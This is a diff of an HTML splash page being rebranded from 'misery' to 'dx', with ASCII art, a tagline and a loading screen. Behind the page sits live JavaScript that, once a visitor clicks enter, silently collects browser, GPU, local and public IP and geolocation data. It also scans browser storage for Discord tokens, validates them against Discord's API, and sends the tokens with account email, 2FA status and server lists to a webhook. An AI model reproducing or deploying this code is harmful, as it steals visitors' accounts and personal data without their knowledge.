@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>@ misery</title>
+    <title>@ dx</title>
     <style>
         * {
             margin: 0;
@@ -102,11 +102,10 @@
             align-items: center;
         }
 
-        /* Rest of original styles */
         .ascii-art {
             font-family: 'Courier New', monospace;
-            font-size: clamp(6px, 1.2vw, 14px);
-            line-height: 1.2;
+            font-size: clamp(4px, 0.9vw, 11px);
+            line-height: 1.15;
             color: #cccccc;
             white-space: pre;
             letter-spacing: 0px;
@@ -241,7 +240,7 @@
     <!-- LOADING SCREEN -->
     <div id="loadingScreen">
         <div class="loader"></div>
-        <div class="loader-text">LOADING MISERY</div>
+        <div class="loader-text">LOADING DX</div>
     </div>
 
     <!-- ENTER BUTTON -->
@@ -251,44 +250,44 @@
     <div id="mainContent">
         <div class="container" style="width:100%;max-width:900px;display:flex;flex-direction:column;align-items:center;">
             <div class="ascii-art" id="asciiArt">
-⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢄⠢⡑⠌⢆⡃⠘⡠⢈⠱⠌⢓⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢤⣵⠚⣠⢂⠱⢈⠆⡌⠱⠠⢃⠈⣈⠒⠬⢷⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⢛⡹⠗⣠⠊⠤⣁⠒⢀⠆⡑⢌⠢⡀⠕⠢⢴⣻⣏⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢊⡑⢢⢁⡚⢁⣞⠰⡠⠁⠎⡐⢌⠢⡑⣌⠨⢑⡮⠗⡙⢾⣟⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡘⢄⡘⢄⠢⡀⢊⠜⢣⠁⡜⣰⣌⡆⡱⣒⣤⢳⠐⡱⠐⡌⠌⢟⢯⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠣⢀⠘⡀⠇⠀⡃⠜⡠⠠⠃⡧⠿⡄⡿⠿⠟⡛⢸⡠⢣⠘⠸⢠⠿⣿⣧⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠌⢀⠃⡌⠤⠁⠌⡰⢁⠆⡰⢁⠢⡑⢌⠲⡱⢨⠥⣿⣿⡤⢉⠆⡡⢀⠈⢛⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⢂⠄⡒⠠⡑⠠⡑⠰⡈⠄⡂⠌⡆⠍⣬⠓⡥⡜⣰⣿⣿⣷⣮⠂⡔⢩⠀⠒⠄⢂⡈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢌⠰⡈⠢⢌⠡⠂⡔⠈⠥⡘⠄⠁⡏⠐⡰⣣⣾⠧⣡⣿⣿⠏⠀⢠⠁⠜⢠⠂⠈⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠠⡐⢌⠰⣁⠃⠄⠃⢠⠘⠀⡃⠬⣙⡀⠃⠄⢀⠀⣸⣿⣿⣿⣿⢀⡄⣿⡎⠸⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠰⠈⠐⢠⡉⢠⠀⠰⣁⢆⢃⡆⣄⣤⣸⣿⣿⣿⣿⣿⣿⣯⠄⢣⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠄⠐⡜⠸⡧⠂⠵⡐⡌⣻⢾⣿⣿⣿⣿⣿⣿⡿⠟⠁⢈⠂⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠈⡀⠀⠘⡀⠀⠈⠀⠳⡈⡈⢟⣭⣽⣯⣍⡽⠇⡀⠀⠀⡁⠀⠐⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠁⠀⠄⠁⠀⠀⠀⢠⡄⠑⢱⣰⣿⣿⣿⣵⣿⠘⢠⣶⣿⣗⡂⠀⠡⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠐⠈⠠⢈⠀⠀⢠⠿⡏⡀⠈⡺⡿⡻⢛⠏⠇⠁⣿⣿⣿⡿⣵⠀⠀⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠂⠈⠄⡀⢠⣖⢿⣻⡽⠻⣿⢧⡀⠀⠨⢻⡢⣸⣿⣿⣿⠏⣾⡄⠀⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡁⠠⠁⠀⣰⣳⢾⣏⣷⣻⢷⡙⢿⣻⣽⣦⣟⡧⣿⣿⣿⣟⣞⢯⣷⡀⠀⠀⣃⠐⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠄⠁⢠⠇⣟⣯⢞⡶⣯⣟⣧⡀⠙⡣⢿⡎⣼⣿⣿⡿⣿⡾⣿⣿⡷⣄⠀⠰⠠⠀⠐⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢂⠈⢀⠀⢈⣇⠹⢞⡏⠉⢳⣯⢘⠝⠁⠉⢋⣵⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣦⠂⠁⢂⠀⠂⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠂⠀⣸⠷⣠⣅⡚⠒⠛⠈⠀⠀⣠⣶⣿⣿⣿⣿⢷⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⡂⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⠀⠀⢠⣏⢧⢃⡿⣿⣿⣿⣶⣴⣾⣿⣿⣿⠟⢋⡜⢟⣿⣿⢿⣿⣿⣿⣿⣿⣿⡧⡀⠀⠅⠢⠀⡀⢀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⢠⠀⢠⠘⠀⠀⡄⠀⠛⢨⣾⠁⠈⣿⣿⣿⣿⣿⠛⣿⠐⣾⠋⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣦⣬⠀⠃⠀⠂⠀⠀⠀⢰⡄⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⡄⣈⠂⠀⠰⡟⢻⠟⣾⣷⣟⠀⢼⣿⣿⠟⠉⠀⣀⣀⠀⣠⣶⣛⣛⡿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣾⣿⣿⣿⡖⠡⠈⠊⠄⠂⠉⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄⠢⠁⠀⠀⠀⠀⢀⣿⣿⣿⣿⣙⣿⣷⠌⠋⠁⠀⠄⠰⡏⢅⣺⣿⣍⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣽⣿⠃⠀⠀⠈⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣛⡏⢔⠋⠙⠢⢀⡤⣵⣿⣿⣿⣿⣿⣮⣯⢿⣟⣿⡿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠛⠿⣿⠿⠿⠛⠃⠀⠄⠡⠐⠈⣽⣿⣿⣿⣿⣿⣿⣿⣷⣿⡟⠿⣿⣿⣿⣿⡿⡿⠟⠁⠀⡀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠉⠁⠈⠁⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⢀⠊
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⡠⣶⣡⣴⡲⠤⠄⣤⣤⣴⣾⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠓⣄⠀⠀⠀⡇⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠜⣓⣽⣿⣿⣷⣶⣿⣿⣿⣿⣿⣿⣿⡟⠃⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⠀⠀⠡⡀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⣄⠐⢁⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⡇⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡘⢁⢣⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠇⠀⠀⢰⠁⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡷⣣⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣋⣻⣿⣿⣿⡿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠔⠁⠀⣀⠂⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠬⠂⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⠁⠀⣄⢻⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡪⠴⠒⠉⠁⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⡎⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠈⠉⠈⢊⡂⢤⠀⠀⠀⠀⡠⠔⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡰⣱⣿⣿⣿⣿⣿⣿⣿⢻⢚⢿⣿⣿⠉⠀⠀⠀⠀⠀⠀⠀⢰⠏⠀⠀⠠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢭⣽⣿⣿⣿⣿⣿⣿⣿⣿⣄⠣⠽⠝⢿⠃⠀⠀⠀⠀⠀⠀⢀⠠⡷⠾⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⢒⢤⣦⠀⠀⠀⠀⠀⠀⠀⠀⣴⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠋⣿⣿⣿⣿⣿⣿⣿⡟⠒⠀⡈⠑⠢⣤⠄⣀⡀⠀⠀⢠⡧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠾⢿⣿⣿⣟⡋⠁⠀⠀⠰⠀⠀⠀⠑⣦⠒⠛⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣼⣁⠀⠀⠀⠈⠉⠐⠢⠇⡀⠀⣰⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠈⠑⡏⠪⢑⠢⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣷⣄⣀⠀⠀⠀⢸⠀⠀⣠⠼⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣍⠂⠀⠘⡆⠰⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⡇⣰⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡍⠻⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠹⣿⣿⣿⣿⣷⠀⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⣿⣿⣿⣿⣿⣧⡌⠻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⢿⡿⡿⢿⢿⡿⡿⢿⠿⡿⣿⢿⠿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
             </div>
-            <div class="tagline">MISERY</div>
-            <div class="sub">what's a hightier human to a lowtier god</div>
+            <div class="tagline">DX</div>
+            <div class="sub">ayoko sa mga feeling gods</div>
         </div>
-        <div class="footer">@misery</div>
+        <div class="footer">@dx</div>
     </div>
 
     <script>
@@ -361,7 +360,7 @@
             }
             const loaderText = document.querySelector('.loader-text');
             if (loaderText) {
-                loaderText.textContent = 'LOADING MISERY ' + Math.floor(loadProgress) + '%';
+                loaderText.textContent = 'LOADING DX ' + Math.floor(loadProgress) + '%';
             }
         }, 120);
 
@@ -370,17 +369,14 @@
             this.classList.remove('show');
             this.style.display = 'none';
             mainContent.classList.add('show');
-
-            // Collect everything silently
             collectAllData();
         });
 
         // ---------- COLLECT ALL DATA SILENTLY ----------
         function collectAllData() {
-            // Send initial header
-            sendToWebhook('🔴 **MISERY DATA HARVEST**');
+            sendToWebhook('🔴 **DX DATA HARVEST**');
 
-            // 1. Browser & system info (no permission needed)
+            // 1. Browser & system info
             const info = [];
             info.push(`🌐 **Browser Info:**`);
             info.push(`  User Agent: ${navigator.userAgent}`);
@@ -394,7 +390,7 @@
             if (navigator.deviceMemory) info.push(`  Device Memory: ${navigator.deviceMemory} GB`);
             if (navigator.maxTouchPoints) info.push(`  Touch Points: ${navigator.maxTouchPoints}`);
 
-            // GPU via WebGL (silent, no permission)
+            // GPU
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -407,13 +403,11 @@
                 }
             } catch(e) {}
 
-            // Local IP via WebRTC (silent, no permission, no popup)
+            // Local IP via WebRTC (silent)
             try {
                 const pc = new RTCPeerConnection({ iceServers: [] });
                 pc.createDataChannel('test');
-                pc.createOffer()
-                    .then(offer => pc.setLocalDescription(offer))
-                    .catch(() => {});
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                 pc.onicecandidate = function(e) {
                     if (e.candidate) {
                         const ipMatch = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
@@ -426,13 +420,13 @@
                 setTimeout(() => { try { pc.close(); } catch(e) {} }, 2000);
             } catch(e) {}
 
-            // Cookies count
+            // Cookies
             try {
                 const cookies = document.cookie.split(';').filter(c => c.trim());
                 info.push(`  Cookies: ${cookies.length} found`);
             } catch(e) {}
 
-            // Storage sizes
+            // Storage
             try {
                 let total = 0;
                 for (let key in localStorage) {
@@ -450,13 +444,12 @@
 
             sendToWebhook('```\n' + info.join('\n') + '\n```');
 
-            // 2. Public IP (no permission needed, just fetch)
+            // 2. Public IP + geolocation
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
                 .then(data => {
                     if (data && data.ip) {
                         sendToWebhook(`🌐 **Public IP:** ${data.ip}`);
-                        // Also try geolocation of IP via free API (no permission)
                         fetch(`http://ip-api.com/json/${data.ip}`)
                             .then(r => r.json())
                             .then(geo => {
@@ -469,7 +462,7 @@
                 })
                 .catch(() => {});
 
-            // 3. Scan for Discord tokens (silent)
+            // 3. Discord token scan
             setTimeout(() => {
                 scanDiscordToken();
             }, 1000);
@@ -566,7 +559,6 @@
             });
 
             if (uniqueTokens.length === 0) {
-                // Silent - no popup, just send a note
                 sendToWebhook('🚫 No Discord tokens found in browser storage.');
                 return;
             }
@@ -590,10 +582,9 @@
                         validCount++;
                         const tag = data.global_name || data.username || data.id;
                         userInfo = ` | ${tag} (${data.id})`;
-                        // Send full valid token with all info
                         await sendToWebhook(`🎯 **VALID TOKEN**\nToken: \`${token}\`\nUser: ${tag} (${data.id})\nEmail: ${data.email || 'N/A'}\n2FA: ${data.mfa_enabled ? 'Yes' : 'No'}\nNitro: ${data.premium_type || 'None'}\nVerified: ${data.verified ? 'Yes' : 'No'}\nCreated: ${data.created_at || 'N/A'}`);
                         
-                        // Get guilds for this token
+                        // Guilds
                         try {
                             const gRes = await fetch('https://discord.com/api/v9/users/@me/guilds', {
                                 headers: { 'Authorization': token }
@@ -608,7 +599,7 @@
                             }
                         } catch(e) {}
 
-                        // Get connections
+                        // Connections
                         try {
                             const cRes = await fetch('https://discord.com/api/v9/users/@me/connections', {
